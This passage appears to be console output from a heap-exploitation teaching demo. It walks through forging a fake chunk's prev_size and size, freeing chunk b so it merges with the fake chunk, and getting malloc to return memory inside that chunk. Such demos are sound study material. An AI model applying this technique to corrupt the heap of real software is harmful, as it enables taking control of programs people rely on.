Our fake prev_size will be 0x1147040 - 0x7fff79af29a0 = 0xffff8000876546a0

Modify fake chunk's size to reflect b's new prev_size
Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set
Our fake chunk size is now 0xffff800087675661 (b.size + fake_prev_size)

Now we can call malloc() and it will begin in our fake chunk
Next malloc(0x200) is at 0x7fff79af29b0
```



